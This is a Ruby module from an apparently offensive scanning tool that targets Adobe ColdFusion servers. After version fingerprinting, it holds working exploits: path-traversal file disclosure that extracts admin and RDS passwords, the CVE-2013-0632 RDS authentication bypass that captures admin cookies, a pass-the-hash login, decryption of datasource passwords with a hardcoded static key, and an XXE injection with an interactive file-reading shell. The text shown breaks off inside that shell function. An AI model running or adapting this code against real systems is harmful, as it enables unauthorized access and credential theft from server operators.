# ColdFusion Specific Checks and/or Audits

class Coldfusion
  def initialize(site)
    @os=0 # 1=Windows (mpost common), 2=Linux
    @mode=nil
    @site=site.sub(/\/$/, '')
    @http=EasyCurb.new
  end

  # Determine Enterprise vs Standard Edition based on Server Response
  # Errors are handled differently between versions
  # Enterprise version also supports JSP in addition to CFM
  # Returns array [ 'OS type', 'CF Mode' ]
  def ent_vs_std(site=@site)
    res = @http.get("#{site}/foooootastic.jsp")
    if res[3] =~ /Server: (.+)/i
      orez = $1.chomp
    end
    if not orez.nil? and orez != ''
      if orez =~ /IIS|Windows|Win32|Win64|WoW64|\.NET/
        @os=1 # Windows
      else
        @os=2 # Likely Not Windows
      end
    end
    if res[1] == 200 or res[1] == 404
      @mode = 'Enterprise Edition'
    else
      @mode = 'Standard Edition'
    end
    case @os.to_i
    when 1
      return 'Windows', @mode
    when 2
      return 'Linux', @mode
    else
      return 'Unknown', @mode
    end
  end

  # Run File Scan for common ColdFusion files
  # Reports findings to user in terminal
  # Also returns results in hash format
  def cf_file_scan(site=@site, verbose=true)
    trap("SIGINT") {
      print_error("CTRL+C! Returning to Previous Menu....")
      return
    }
    print_status("Running ColdFusion File Scanner....")
    arrayoflinks = ["#{site}/index.cfm", "#{site}/version.txt", "#{site}/CFIDE/adminapi/base.cfc?wsdl", "#{site}/CFIDE/main/ide.cfm"]
    admin = [ "/CFIDE/administrator/index.cfm", "/CFIDE/administrator/enter.cfm", "/admin/index.cfm" ]
    api =   [ '/CFIDE/adminapi/administrator.cfm', '/CFIDE/adminapi/customtags/l10n.cfm' ]
    computils = [ "/CFIDE/componentutils/index.cfm", "/CFIDE/componentutils/login.cfm", "/CFIDE/componentutils/packagelist.cfm" ]
    fckeditor = [ "/CFIDE/scripts/ajax/FCKeditor/editor/dialog/fck_about.html", 
                  "/CFIDE/scripts/ajax/FCKeditor/fckeditor.cfm",
                  "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf_connector.cfm",
                  "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm",
                  "/FCKeditor/editor/filemanager/connectors/cfm/cf_connector.cfm",
                  "/FCKeditor/editor/filemanager/connectors/cfm/cf5_connector.cfm" ]
    lpd = [ '/CFIDE/probe.cfm', '/nul.dbm', '/null.dbm', "/cfappman/index.cfm", "/cfdocs/snippets/viewexample.cfm", "/cfdocs/snippets/evaluate.cfm", "/CFIDE/debug/cf_debugFr.cfm" ]
    planblfi = [ "/CFIDE/wizards/common/_logintowizard.cfm", "/CFIDE/wizards/common/_authenticatewizarduser.cfm", "/CFIDE/administrator/archives/index.cfm", "/CFIDE/install.cfm", 
                 "/CFIDE/administrator/entman/index.cfm", "/CFIDE/administrator/logging/settings.cfm" ]
    railo = [ "/railo-context/admin/web.cfm", "/railo-context/test.cfm", "/railo-context/templates/display/debugging-console.cfm" ]
    xmlinjects = [ "/flex2gateway/http", "/flex2gateway/httpsecure", "/flex2gateway/cfamfpolling",	"/flex2gateway/amf", "/flex2gateway/amfpolling", 
                   "/messagebroker/http", "/messagebroker/httpsecure", "/blazeds/messagebroker/http", "/blazeds/messagebroker/httpsecure", 
                   "/samples/messagebroker/http", "/samples/messagebroker/httpsecure", "/lcds/messagebroker/http", "/lcds/messagebroker/httpsecure", 
                   "/lcds-samples/messagebroker/http", "/lcds-samples/messagebroker/httpsecure" ]

    admin.each {|x| arrayoflinks << "#{site}#{x}" }
    api.each {|x| arrayoflinks << "#{site}#{x}" }
    computils.each {|x| arrayoflinks << "#{site}#{x}" }
    fckeditor.each {|x| arrayoflinks << "#{site}#{x}" }
    lpd.each {|x| arrayoflinks << "#{site}#{x}" }
    planblfi.each {|x| arrayoflinks << "#{site}#{x}" }
    railo.each {|x| arrayoflinks << "#{site}#{x}" }
    xmlinjects.each {|x| arrayoflinks << "#{site}#{x}" }

    # Returns a Hash { 'url link' => [single response array] }
    # response_body, response_code, repsonse_time, response_headers
    hashres = @http.multi_get(arrayoflinks)

    if verbose
      # Print results in nice table format
      t = [["URL", "CODE"], ["#{site}", " - "]]
      hashres.each do |key, value|
        code = value.response_code
        t << [ "#{key.sub(site, '')}", code ]
      end
      table = t.to_table(:first_row_is_head => true)
      puts table.to_s
    end
    return hashres
  end

  # Test For background.jpg file
  # Take MD5 value of response page and test for known versions
  # Tthanks to HTP for this idea!
  # Returns version or nil if doesn't match anything
  def md5_version_check(site=@site)
    if @mode.nil?
      ent_vs_std(site)
    end
    imagefile = '/CFIDE/administrator/images/loginbackground.jpg'
    uri = URI("#{site}#{imagefile}")
    rez = @http.get(uri.to_s)
    if rez[3] =~ /Server: (.+)/i
      orez = $1.chomp
    end
    if not orez.nil? and orez != ''
      if (orez =~ /IIS|Windows|Win32|Win64|WoW64|\.NET/)
        print_status("Windows Server: #{orez}")
        @os=1 # Windows
      else
        print_status("Server: #{orez}")
        @os=2 # Likely Not Windows
      end
    end
    md5fingerprint = Digest::MD5.hexdigest(rez[0])
    case md5fingerprint
    when 'a4c81b7a6289b2fc9b36848fa0cae83c'
      print_good("ColdFusion Version: 10 - #{@mode}")
      version=10
      return version
    when '596b3fc4f1a0b818979db1cf94a82220'
      print_good("ColdFusion Version: 9 - #{@mode}")
      version=9
      return version
    when '779efc149954677095446c167344dbfc'
      print_good("ColdFusion Version: 8 - #{@mode}")
      version=8
      return version
    else
       print_error("Unable to Determine ColdFusion Version via MD5 fingerprint...")
      return nil
    end
  end

  # If we didn't find the version using the md5 check then....
  # Use my original regex method on admin index pages to pull version info
  # Returns version or nil if doesn't match anything
  def planb_version_check(site=@site)
    if @mode.nil?
      ent_vs_std(site)
    end
    fail=true
    links = [ "/CFIDE/administrator/index.cfm", "/CFIDE/administrator/enter.cfm", "/CFIDE/componentutils/index.cfm", "/CFIDE/componentutils/login.cfm" ]
    while(true) # So we can bail out when we know version, no need to beat on the door
      links.each do |check|
        uri = URI("#{site}#{check}")
        rez = @http.get(uri.to_s)
        if rez[1] == 200
          if rez[0] =~ />\s*Version:\s*(.*)<\/strong\><br\s\//
            v = $1
            fail=false
            version=v.split(",")[0].to_i
            print_good("ColdFusion Version: #{version} - #{@mode}")
            return version
          elsif rez[0] =~ /Version\s*(.*)\s+<\/strong\><br\s\//
            v = $1
            fail=false
            version=v.split(",")[0].to_i
            print_good("ColdFusion Version: #{version} - #{@mode}")
            return version
          elsif rez[0] =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2006 Adobe/
            version=8
            fail=false
            print_good("ColdFusion Version: #{version} - #{@mode}")
            return version
          elsif rez[0] =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995\-2009 Adobe Systems\, Inc\. All rights reserved/
            version=9
            fail=false
            print_good("ColdFusion Version: #{version} - #{@mode}")
            return version
          elsif rez[0] =~ /<meta name=\"Author\" content=\"Copyright \(c\) 1995-2010 Adobe/
            version=10 #Not sure but assume 10 and in "most" cases its right
            fail=false
            print_good("ColdFusion Version: 9 || 10 - #{@mode}")
            return version
          elsif rez[0] =~ /<meta name=\"Keywords\" content=\"(.*)\">\s+<meta name/
            out = $1.split(/,/)[0]
            fail=false
            version=out.to_i
            print_good("ColdFusion Version: #{version} - #{@mode}")
            return version
          end
        end
      end
      break
    end
    print_error("Unable to Determine ColdFusion Version from login panel source code...")
    return nil
  end

  # Check the WSDL Service Output
  # Gives signs of CF version in comments
  # Returns version or nil if doesn't match anything
  def wsdl_version_check(site=@site)
    if @mode.nil?
      ent_vs_std(site)
    end
    wsdl = '/CFIDE/adminapi/base.cfc?wsdl'
    uri = URI("#{site}#{wsdl}")
    rez = @http.get(uri.to_s)
    if rez[0] =~ /<!--WSDL created by ColdFusion version (.+)-->/i
      version=$1.split(",")[0].to_i
      print_good("ColdFusion Version: #{version} - #{@mode}")
      return version
    else
      print_error("Unable to Determine ColdFusion Version via WSDL file...")
      return nil
    end
  end

  # Borrowed from carnal0wnage MSF module
  # When No User Sent it will produce error message with version info
  # Returns version or nil if doesn't match anything
  def rds_version_check(site=@site)
    check = "#{site}/CFIDE/main/ide.cfm?CFSRV=IDE&ACTION=IDE_DEFAULT"
    data = "4:STR:14:ConfigurationsSTR:10:7, 0, 0, 0STR:0:STR:18:4411433f371d434005" #no username & password of password1
    rez = @http.post(check, data)
    if rez[1] == 200
      if rez[0] =~ /ColdFusion Server Version:.(.+):.+ColdFusion Client Version:.(.+):\d*:/
        server = $1
        client = $2
        if (client.nil? or server.nil?)
          print_error("Unable to Determine ColdFusion Version via RDS Panel...")
          return nil
        else
          version=$1.split(',')[0]
          print_status("RDS is Enabled!")
          print_good("ColdFusion Version: #{version} - #{@mode}")
          return version
        end
      else
        print_error("Unable to Determine ColdFusion Version via RDS Panel...")
        return nil
      end
    else
      print_error("Unable to Determine ColdFusion Version via RDS Panel...")
      return nil
    end
  end

  # Backup OS Check for v9 & v10
  # Sets the OS instance & LFD vars if found
  def os_lion_check(site=@site)
    confirmed=false
    bootini = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../boot.ini&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=#{randz(rand(8))}"
    etchosts = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=../../../../../../../../../../../../../../../etc/hosts&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=#{randz(rand(8))}"

    uri="#{site}#{bootini}"
    rez = @http.get("#{uri}")
    lfd='fail'
    if rez[0] =~ /([A-Za-z]:\\[^\s\\]+\\.+:\d+)/
      lfd=$1
      print_caution("Local Path Disclosure: #{lfd}") unless lfd == 'fail' or @lfd
      @lfd=true
    end
    if rez[0] =~ /\[boot loader\]|\[operating systems\]/
      @os=1 # Windows
      confirmed=true
    end

    if not confirmed
      uri="#{site}#{etchosts}"
      rez = @http.get("#{uri}")
      if rez[0] =~ /hosts|127.0.0.1/
        @os=2 # Linux
      end
    end
    return @os
  end

  # CVE-2013-0632
  # Default Misconfiguration in API allows authentication bypass
  # When RDS == true and pass is null it doesnt check fully allowing bypass
  # Admin cookies are set in response if successful
  # Returns auth cookies or nil
  def rds_auth_bypass(site=@site)
    lfd='fail'
    uri="#{site}/CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true"
    rez = @http.get("#{uri}")
    if rez[0] =~ /([A-Za-z]:\\[^\s\\]+\\.+:\d+)/
      lfd=$1
    end
    if rez[0] =~ /File not found: \/CFIDE\/adminapi\/administrator.cfm/
      print_error("Epic Fail - API System doesn't exist or isn't accessible!")
      print_caution("Local Path Disclosure: #{lfd}") unless lfd == 'fail' or @lfd == true
      if lfd != 'fail' and @lfd == false
        @lfd=true
      end
      puts
      return false
    end
    cookies=[]
    rez[3].split("\n").each do |line|
      if line =~ /Set-cookie: (.+);/i
        cookies << $1.chomp
      end
    end
    admin_cookies = cookies.join(';').sub('CFAUTHORIZATION_cfadmin=;', '')

    if admin_cookies =~ /CFAUTHORIZATION_cfadmin=(\S+);|CFAUTHORIZATION_cfadmin=(\S+)$/
      uri=URI("#{site}/CFIDE/adminapi/administrator.cfc?method=login&adminpassword=&rdsPasswordAllowed=true")
      c=Regexp.last_match.to_s.split('=')[1].gsub('"', '').sub(';', '')
      if not c.nil? and c != '""' and c != ''
        id=0
        token=0
        Dir.mkdir("#{RESULTS}#{uri.host}") unless File.exists?("#{RESULTS}#{uri.host}") and File.directory?("#{RESULTS}#{uri.host}")
        f=File.open("#{RESULTS}#{uri.host}/coldfusion_cookies.txt", 'w+')
        f.puts "w00t - Authenticated using RDS Auth Bypass Technique!"
        f.puts "################### ADMIN COOKIES #####################"
        print_good("w00t - Authenticated using RDS Auth Bypass Technique!")
        puts "################### ADMIN COOKIES #####################".light_blue
        print_good("URI: #{uri}")
        f.puts "URI: #{uri}"
        f.puts "LPD: #{lfd}" unless lfd == 'fail' or @lfd == true
        print_good("LPD: #{lfd}") unless lfd == 'fail' or @lfd == true
        if lfd != 'fail' and @lfd == false
          @lfd=true
        end

        admin_cookies.gsub('path=/, ', '').split(';').each do |cookie|
          c=cookie.split('=')
          if c[0] == 'CFID'
            print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == '' or id == 1
            f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or id == 1
            id=1
          elsif c[0] == 'CFTOKEN'
            print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == '' or token == 1
            f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or token == 1
            token=1
          elsif c[0] == 'CFAUTHORIZATION_cfadmin'
            print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == ''
            f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == ''
          else
            print_good("#{c[0]}: #{c[1]}") unless c[1].nil? or c[1] == '' or c[0] == 'path' or c[0] == 'expires'
            f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or c[0] == 'path' or c[0] == 'expires'
          end
        end

        puts "#######################################################".light_blue
        f.puts "#######################################################\n"
        puts
        return true
      else
        print_error("RDS Auth Bypass Not Working!")
        print_caution("Local Path Disclosure: #{lfd}") unless lfd == 'fail' or @lfd == true
        if lfd != 'fail' and @lfd == false
          @lfd=true
        end
        return false
      end
    else
      print_error("RDS Auth Bypass Not Working!")
      print_caution("Local Path Disclosure: #{lfd}") unless lfd == 'fail' or @lfd == true
      if lfd != 'fail' and @lfd == false
        @lfd=true
      end
      return false
    end
  end

  # HTP SubZero Exploit ported to Ruby
  # Bad l10n parsing leads to LFI
  # Displays Admin Password on Success
  # Results also logged to file for safe keeping
  # Returns true on success, false otherwise
  def subzero(path, site=@site)
    uri="#{site}/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=#{path}&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=#{randz(rand(8))}"
    rez = @http.get("#{uri}")
    lfd='fail'
    if rez[0] =~ /([A-Za-z]:\\[^\s\\]+\\.+:\d+)/
      lfd=$1
    end
    if rez[0] =~ /encrypted=true/
      if rez[0] =~ /^rdspassword=(.+)\s+/
        @rdspass = $1.sub('\n', '').chomp
      end
      if rez[0] =~ /^password=(.+)/
        @password = $1.chomp
      end
      dbpasses = neo_file("#{site}/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=#{path}&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=#{randz(rand(8))}")
      url=URI(site)
      if not dbpasses.nil?
        neo = "#{RESULTS}#{url.host}/neo-datasource.xml"
      else
        Dir.mkdir("#{RESULTS}#{url.host}") unless File.exists?("#{RESULTS}#{url.host}") and File.directory?("#{RESULTS}#{url.host}")
      end

      print_good("w00t - site is vulnerable!")
      puts "#################".light_blue + " CF CREDENTIALS ".white + "###################".light_blue
      print_good("URI: #{uri}")
      print_good("LPD: #{lfd}") unless lfd == 'fail' or @lfd == true
      print_good("RDS PASS: #{@rdspass}") unless @rdspass == '' or @rdspass.nil?
      print_good("ADMIN PASS: #{@password}") unless @password == '' or @password.nil?

      f=File.open("#{RESULTS}#{url.host}/coldfusion#{@v}.txt", 'w+')
      f.puts "w00t - site is vulnerable!"
      f.puts "################# CF CREDENTIALS ###################"
      f.puts "URI: #{uri}"
      f.puts "LPD: #{lfd}" unless lfd == 'fail' or @lfd == true
      f.puts "RDS PASS: #{@rdspass}" unless @rdspass == '' or @rdspass.nil?
      f.puts "ADMIN PASS: #{@password}" unless @password == '' or @password.nil?

      @lfd=true unless @lfd
      if not dbpasses.nil?
        print_good("DataSource DB Connection Password(s): ")
        f.puts "DataSource DB Connection Password(s): "
        dbpasses.each do |pass|
          puts "     Encrypted".light_green + ": #{pass}".white
          f.puts "  Encrypted: #{pass}"
          decrypted = neo_decrypt(pass)
          puts "     Decrypted".light_green + ": #{decrypted}".white
          f.puts "  Decrypted: #{decrypted}"
        end
        print_good("DataSource File Saved to: #{neo}")
        f.puts "DataSource File Saved to: #{neo}"
      end
      puts "####################################################\n".light_blue
      f.puts "####################################################\n"
      f.close
      return true
    else
      print_error("No Credentials Found!")
      print_caution("Local Path Disclosure: #{lfd}") unless lfd == 'fail' or @lfd
      @lfd=true unless @lfd
      return false
    end
  end

  # Old LFI method via 'locale' parameter on admin index (and several others)
  # Displays Authenticated Admin Cookie on Success
  # Results also logged to file for safe keeping
  # Returns true on success, false otherwise
  def old_lfi(path, site=@site)
    uri="#{site}/CFIDE/administrator/enter.cfm?#{path}"
    rez = @http.get("#{uri}")

    if rez[1] == 200
      doc = Hpricot(rez[0])
      creds = "#{doc.search('title')}".sub('<title>', '').sub('</title>', '')
      if rez[0] =~ /\<input name="salt" type="hidden" value="(\d+)"\>/
        @salt = $1
      end
      if not creds.nil?
        foo = creds.split("\n")
        foo.each do |line|
          if line =~ /password=\w+/ and not line =~ /rdspassword=\w+/
            @password = line.sub('password=', '').chomp
          elsif line =~ /rdspassword=(.+)/i
            @rdspass = $1.sub('\n', '').chomp
          end
        end

        # If pass is present, continue and generate the HMAC hash based on password + salt....
        if not @password.nil?
          dbpasses = neo_file(uri)
          hash = OpenSSL::HMAC.hexdigest('sha1', @salt, @password)
          uri=URI(site)

          if not dbpasses.nil? and dbpasses.size > 0
            neo = "#{RESULTS}#{uri.host}/neo-datasource.xml"
          else
            Dir.mkdir("#{RESULTS}#{uri.host}") unless File.exists?("#{RESULTS}#{uri.host}") and File.directory?("#{RESULTS}#{uri.host}")
          end

          f=File.open("#{RESULTS}#{uri.host}/coldfusion#{@v}.txt", 'w+')
          f.puts "\nw00t - site is vulnerable!"
          f.puts "################# CF CREDENTIALS ###################"
          f.puts "LFI:        #{uri}"
          f.puts "RDS Pass:   #{@rdspass}" unless @rdspass.nil? or @rdspass == ''
          f.puts "Admin Pass: #{@password}"
          f.puts "Admin Salt: #{@salt}"
          f.puts "HMAC Hash:  #{hash.chomp}" if not hash.nil?
          if not dbpasses.nil?
            f.puts "DataSource DB Connection Password(s): "
            dbpasses.each do |pass|
              f.puts "      DataSource Encrypted:  #{pass}"
              decrypted = neo_decrypt(pass)
              f.puts "      DataSource Decrypted:  #{decrypted}"
            end
            f.puts "DataSource File Saved to: #{neo}"
          end
          f.puts "####################################################\n"
          f.close


          print_good("w00t - site is vulnerable!")
          puts "#################".light_blue + " CF CREDENTIALS ".white + "###################".light_blue
          print_good( "LFI:        #{uri}")
          print_good( "RDS Pass:   #{@rdspass}") unless @rdspass.nil? or @rdspass == ''
          print_good( "Admin Pass: #{@password}")
          print_good( "Admin Salt: #{@salt}") 
          print_good( "HMAC Hash:  #{hash.chomp}") if not hash.nil?
          if not dbpasses.nil?
            print_good("DataSource DB Connection Password(s): ")
            dbpasses.each do |pass|
              puts "     Encrypted".light_green + ":  #{pass}".white
              decrypted = neo_decrypt(pass)
              puts "     Decrypted".light_green + ":  #{decrypted}".white
            end
            print_good("DataSource File Saved to: #{neo}")
          end
          puts "####################################################\n".light_blue

          # Login using HMAC to bypass the need to crack password hash
          # On success admin cookie will be set: CFAUTHORIZATION_cfadmin=<something>
          # if not it will return null :(
          if not hash.nil?
            finalurl = URI("#{site}/CFIDE/administrator/enter.cfm")
            rez = Curl.post(finalurl.to_s, { "cfadminPassword" => "#{hash.upcase.chomp}", "requestedURL" => "/CFIDE/administrator/enter.cfm", "salt" => "#{@salt}", "submit" => "login"})
            cookies=[]
            rez.header_str.split("\n").each do |line|
              if line =~ /Set-cookie: (.+);/i
                cookies << $1.chomp
              end
            end
            admin_cookies = cookies.join(';')
            if not admin_cookies.nil?
              id=0;token=0;
              f=File.open("#{RESULTS}#{uri.host}/coldfusion#{@v}.txt", 'a+')
              f.puts "w00t - Authenticated using Pass-The-Hash Technique!"
              print_good("w00t - Authenticated using Pass-The-Hash Technique!")
              f.puts "################### ADMIN COOKIES ##################"
              puts "###################".light_blue + " ADMIN COOKIES ".white + "##################".light_blue
              admin_cookies.gsub('path=/, ', '').split(';').each do |cookie|
                c=cookie.split('=')
                if c[0] == 'CFID'
                  puts "#{c[0]}".light_green + ": #{c[1]}".white unless c[1].nil? or c[1] == '' or id == 1
                  f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or id == 1
                  id=1
                elsif c[0] == 'CFTOKEN'
                  puts "#{c[0]}".light_green + ": #{c[1]}".white unless c[1].nil? or c[1] == '' or token == 1
                  f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or token == 1
                  token=1
                elsif c[0] == 'CFAUTHORIZATION_cfadmin'
                  puts "#{c[0]}".light_green + ": #{c[1]}".white unless c[1].nil? or c[1] == ''
                  f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == ''
                else
                  puts "#{c[0]}".light_blue + ": #{c[1]}".white unless c[1].nil? or c[1] == '' or c[0] == 'path' or c[0] == 'expires'
                  f.puts "#{c[0]}: #{c[1]}" unless c[1].nil? or c[1] == '' or c[0] == 'path' or c[0] == 'expires'
                end
              end
              puts "####################################################\n".light_blue
              f.puts "####################################################\n"
              f.close
            else
              print_error("Pass-The-Hash doesn't seemed to have worked!")
              print_line("")
            end
          end
          return true
        else
          return false
        end
      else
        return false
      end
    else
      return false
    end
  end

  # After successfully grabbing password.properties we can try to grab the neo-datasource.xml
  # This contains the DB Details for all DBs ColdFusion can interact with
  # You can use the Decryptor Option after to decrypt the password hashes found
  def neo_file(link, site=@site)
    uri=URI(site)
    neopasses=[]
    if @v.to_i < 8
      datalink=link.sub('password.properties', 'neo-query.xml')
    else
      datalink=link.sub('password.properties', 'neo-datasource.xml')
    end
    rez = @http.get("#{datalink}")
    if rez[0] =~ /\<string\>[a-zA-Z0-9\+\/]+==\<\/string>/m
      rez[0].scan(/\<string\>([a-zA-Z0-9\+\/]+==)\<\/string>/m) do |match|
        neopasses << match[0]
      end
      if not neopasses.empty?
        Dir.mkdir("#{RESULTS}#{uri.host}") unless File.exists?("#{RESULTS}#{uri.host}") and File.directory?("#{RESULTS}#{uri.host}")
        f=File.open("#{RESULTS}#{uri.host}/neo-datasource.xml", 'w+')
        f.puts rez[0]
        f.close
      end
    end
    if not neopasses.empty?
      return neopasses
    else
      return nil
    end
  end

  # Decrypt the CF Neo Database Credentials, v7-9
  #   Coldfusion 7: \lib\neo-query.xml
  #	for example: c:\CFusionMX7\lib\neo-query.xml
  #   Coldfusion 8: \lib\neo-datasource.xml
  #	for example: c:\coldfusion8\lib\neo-datasource.
  def neo_decrypt(cryptedpass)
    des = OpenSSL::Cipher::Cipher.new('des-ede3')
    des.decrypt
    des.key = '0yJ!@1$r8p0L@r1$6yJ!@1rj' # static key used v7-9 - w00t

    return des.update(Base64.decode64(cryptedpass)) + des.final
  end

  # XML EXTERNAL ENTITY (LFI) INJECTION
  # Affected Sofware: BlazeDS 3.2 and earlier versions
  # LiveCycle 9.0, 8.2.1, and 8.0.1
  # LiveCycle Data Services 3.0, 2.6.1, and 2.5.1
  # Flex Data Services 2.0.1
  # ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2
  # If success then it will drop to pseudo shell
  # If fail, then it just moves on with minimal note
  def xee(site=@site)
    ent_vs_std
    xee_links=[]
    xmlinjects = [ "/flex2gateway/http","/flex2gateway/httpsecure", "/flex2gateway/cfamfpolling", "/flex2gateway/amf", "/flex2gateway/amfpolling", "/messagebroker/http", "/messagebroker/httpsecure", "/blazeds/messagebroker/http", "/blazeds/messagebroker/httpsecure", "/samples/messagebroker/http", "/samples/messagebroker/httpsecure", "/lcds/messagebroker/http", "/lcds/messagebroker/httpsecure", "/lcds-samples/messagebroker/http", "/lcds-samples/messagebroker/httpsecure" ]
    xmlinjects.each {|x| xee_links << "#{site}#{x}" }
    # Curl::Multi Request Option
    # Returns a Hash { 'url link' => [single response array] }
    # response_body, response_code, repsonse_time, response_headers
    hashres = @http.multi_get(xee_links)

    # ANSI color codes set in variables to make custom shit easier :)
    rs="\033[0m"
    hc="\033[1m"
    fgred="\033[31m"
    fggreen="\033[32m"
    fgyellow="\033[33m"
    fgwhite="\033[37m"
    fgblue="\033[34m"
    xlinks=[]
    t = [["#{fgwhite}URL#{fgblue}", "#{fgwhite}CODE#{fgblue}"], ["#{fgwhite}#{site}#{fgblue}", "#{fgwhite} - #{fgblue}"]]
    hashres.each do |key, value|
      if value.response_code == 200
        xlinks << key
        code = "#{fggreen}#{value.response_code}#{fgblue}"
      elsif value.response_code == 301 or value.response_code == 302
        code = "#{fgyellow}#{value.response_code}#{fgblue}"
      else
        code = "#{fgred}#{value.response_code}#{fgblue}"
      end
      t << [ "#{fgwhite}#{key.sub(site, '')}#{fgblue}", code ]
    end
    table = t.to_table(:first_row_is_head => true)
    puts "#{hc}#{fgblue}#{table.to_s}#{rs}"

    # Now try to inject them
    xee_links=[]
    xlinks.each do |link|
      if @os.to_i == 2
        xfile = '/etc/passwd' #Haven't encountered issues trying to read passwd file
      else
        xfile = "C:\\" #Use the C:\\ Dir instead of C:\\boot.ini due to odd permissions issues causins issues detecting occasionally
      end
      puts "Testing".light_blue + ": #{link}".white
      xeeurl = URI.parse(link)
      request = Net::HTTP::Post.new(xeeurl.path, { 'Content-Type' => 'application/x-amf' })
      request.content_type = 'application/x-amf'
      request.body = "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE test [ <!ENTITY x3 SYSTEM \"#{xfile}\"> ]><amfx ver=\"3\" xmlns=\"http://www.macromedia.com/2005/amfx\"><body><object type=\"flex.messaging.messages.CommandMessage\"><traits><string>body</string><string>clientId</string><string>correlationId</string><string>destination</string><string>headers</string><string>messageId</string><string>operation</string><string>timestamp</string><string>timeToLive</string></traits><object><traits /></object><null /><string /><string /><object><traits><string>DSId</string><string>DSMessagingVersion</string></traits><string>nil</string><int>1</int></object><string>&x3;</string><int>5</int><int>0</int><int>0</int></object></body></amfx>"
      response = Net::HTTP.start(xeeurl.host, xeeurl.port) do |http|
        foo = http.request(request)
      end
      if response.body =~ /<\?xml version=\"1\.0\" encoding=\"utf-8\"\?>/
        if response.body =~ /External entities are not allowed/
          puts "\t=> External entities are not allowed".red + "!".white
        elsif response.body =~ /(\w+:.:\d+:\d+:.+:.+:\/\w+\/\w+)/m
          passwdz = $1
          print_line("")
          print_good("w00t - vulnerable *nix box")
          puts "#################### ".light_blue + "SITE CONFIRMED VULN".white + " ##########################".light_blue
          print_good("Vuln Link: #{link}")
          print_good("File: #{xfile}")
          puts "############################ ".light_blue + "BODY".white + " ###############################".light_blue
          puts "#{passwdz}".light_green
          puts "#################################################################\n".light_blue
          xee_links << link
        elsif response.body =~ /boot.ini|Documents and Settings|Program Files|ColdFusion|cfx|Inetpub|ipub|wmpub|temp|/im
          print_line("")
          print_good("w00t - vulnerable Windows box")
          puts "#################### ".light_blue + "SITE CONFIRMED VULN".white + " ##########################".light_blue
          print_good("Vuln Link: #{link}")
          print_good("File: #{xfile}")
          puts "############################ ".light_blue + "BODY".white + " ###############################".light_blue
          puts "#{response.body}".light_green
          puts "#################################################################\n".light_blue
          xee_links << link
        end
      end
    end
    if xee_links.size > 0
      cnt=1
      print_line("")
      print_caution("Select Link to use for XEE Shell: ")
      puts "  0".white + ")".light_blue + " I'm Done Testing".white
      xee_links.each do |link|
        puts "  #{cnt}".white + ")".light_blue + " #{link}".white
        cnt = cnt.to_i + 1
      end
      answer=gets.chomp
      if answer.to_i == 0
        print_status("OK, finished testing.....")
      else
        lnk=answer.to_i - 1
        xee_shell(xee_links[lnk.to_i])
      end
      return true
    else
      print_error("No XEE Injection Found....")
      return false
    end
  end

  # File Reader / Dir Traversal Shell for XEE LFI Vuln above
  def xee_shell(link)
    foo=0
    print_status("Dropping to the XEE Shell now......")
    print_status("This is Directory Traversal with abilities to read files based on current user privileges (usually limited)......")
    print_status("Simply type dirname to list content or filename to read> /etc/ or /etc/passwd OR  C:\\ or C:\\boot.ini")
    print_status("Suggest checking: 'C:\\ColdFusion<VERSION>\\lib\\password.properties' and 'C:\\ColdFusion<VERSION>\\lib\\neo-query.xml'")
    print_caution("Type 'QUIT' or 'EXIT' to exit the pseudo shell.....")
    print_line("\n")

    prompt = "(XEE-Shell)> "
    while line = Readline.readline("#{prompt}", true)
      xfile = line.chomp
      case xfile
      when /^clear|^cls|^banner/i
        cls
        banner
      when /^exit|^quit/i
        print_line("")
        print_error("OK, exiting XEE Shell......")
        print_line("")
        break
      else
        xeeurl = URI.parse(link)
        request = Net::HTTP::Post.new(xeeurl.path, { 'Content-Type' => 'application/x-amf' })
        request.content_type = 'application/x-amf'
        request.body = "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE test [ <!ENTITY x3 SYSTEM \"#{xfile}\"> ]><amfx ver=\"3\" xmlns=\"http://www.macromedia.com/2005/amfx\"><body><object type=\"flex.messaging.messages.CommandMessage\"><traits><string>body</string><string>clientId</string><string>correlationId</string><string>destination</string><string>headers</string><string>messageId</string><string>operation</string><string>timestamp</string><string>timeToLive</string></traits><object><traits /></object><null /><string /><string /><object><traits><string>DSId</string><string>DSMessagingVersion</string></traits><string>nil</string><int>1</int></object><string>&x3;</string><int>5</int><int>0</int><int>0</int></object></body></amfx>"
        response = Net::HTTP.start(xeeurl.host, xeeurl.port) do |http|
          foo = http.request(request)
        end
